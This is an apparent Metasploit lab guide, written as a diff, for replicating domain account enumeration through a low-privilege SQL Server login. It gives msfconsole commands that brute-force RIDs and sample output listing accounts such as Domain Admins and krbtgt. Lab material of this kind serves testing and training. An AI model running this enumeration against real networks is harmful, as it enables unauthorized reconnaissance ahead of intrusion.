@@ -1,0 +1,82 @@
+SQL Server: Enumerating Windows Domain Accounts Through SQL Server with a Low Privilege Login
+Lab setup guide
+
+Below I've provided some basic steps for setting up a SQL Server instance that can be used to replicate the scenario exploited by the mssql_enum_windows_domain_accounts.rb module.
+
+1. Setup a Windows domain.  Hopefully you already have a lab setup with a Windows domain/ADS.  If not you can follow this guide to setup a DC:http://social.technet.microsoft.com/wiki/contents/articles/22622.building-your-first-domain-controller-on-2012-r2.aspx
+
+2. Next, Add a server to the domain that can be used as the sql server. http://technet.microsoft.com/en-us/library/bb456990.aspx
+
+3.	Download the Microsoft SQL Server Express install that includes SQL Server Management Studio on the system just added to the domain.  It can be download at http://msdn.microsoft.com/en-us/evalcenter/dn434042.aspx
+
+4.	Install SQL Server by following the wizard, but make sure to enabled mixed-mode authentication and run the service as LocalSystem for the sake of the lab.
+
+5. Make sure to enable the tcp protocol so that module can connect to the listener.
+http://blogs.msdn.com/b/sqlexpress/archive/2005/05/05/415084.aspx
+
+6.	Log into the SQL Server with the "sa" account setup during installation using the SQL Server Management Studio application.
+
+5.	Press the "New Query" button and use the TSQL below to create a least privilege sql login.  Then log out.
+
+-- Create logins
+CREATE LOGIN MyAppUser1 WITH PASSWORD = 'MyPassword!';
+
+
+6. Test out the metasploit module to enumerate other sql server logins.  
+Note: For the test set the fuzznum to 1000, but you would set it to 10000
+or above in a real environment.
+
+use auxiliary/admin/mssql/mssql_enum_windows_domain_accounts
+msf auxiliary(mssql_enum_windows_domain_accounts) > set rhost <target ip>
+msf auxiliary(mssql_enum_windows_domain_accounts) > set rport <target database port>
+msf auxiliary(mssql_enum_windows_domain_accounts) > set username MyAppUser1
+msf auxiliary(mssql_enum_windows_domain_accounts) > set password MyPassword!
+msf auxiliary(mssql_enum_windows_domain_accounts) > set fuzznum 1000
+msf auxiliary(mssql_enum_windows_domain_accounts) > run
+
+[*] Attempting to connect to the database server at 10.2.9.101:1433 as myappuser1...
+[+] Connected.
+[*] Checking if myappuser1 has the sysadmin role...
+[*] myappuser1 is NOT a sysadmin.
+[*] SQL Server Name: LVA
+[*] Domain Name: DEMO
+[+] Found the domain sid: 0105000000000005150000009cc30dd479441edeb31027d0
+[*] Brute forcing 1000 RIDs through the SQL Server, be patient...
+[*]  - DEMO\administrator
+[*]  - DEMO\Guest
+[*]  - DEMO\krbtgt
+[*]  - DEMO\Domain Admins
+[*]  - DEMO\Domain Users
+[*]  - DEMO\Domain Guests
+[*]  - DEMO\Domain Computers
+[*]  - DEMO\Domain Controllers
+[*]  - DEMO\Cert Publishers
+[*]  - DEMO\Schema Admins
+[*]  - DEMO\Enterprise Admins
+[*]  - DEMO\Group Policy Creator Owners
+[*]  - DEMO\RAS and IAS Servers
+[*]  - DEMO\HelpServicesGroup
+[+] 14 user, groups, and computer accounts were found.
+[*] Query results have been saved to: /root/.msf4/loot/20141117105424_default_10.2.9.101_windows_domain_a_592368.txt
+[*] Auxiliary module execution completed
+msf auxiliary(mssql_enum_windows_domain_accounts) > 
+
+7. Review output file
+cat /root/.msf4/loot/20141117105424_default_10.2.9.101_windows_domain_a_592368.txt
+
+name
+"DEMO\administrator"
+"DEMO\Guest"
+"DEMO\krbtgt"
+"DEMO\Domain Admins"
+"DEMO\Domain Users"
+"DEMO\Domain Guests"
+"DEMO\Domain Computers"
+"DEMO\Domain Controllers"
+"DEMO\Cert Publishers"
+"DEMO\Schema Admins"
+"DEMO\Enterprise Admins"
+"DEMO\Group Policy Creator Owners"
+"DEMO\RAS and IAS Servers"
+"DEMO\HelpServicesGroup"
+
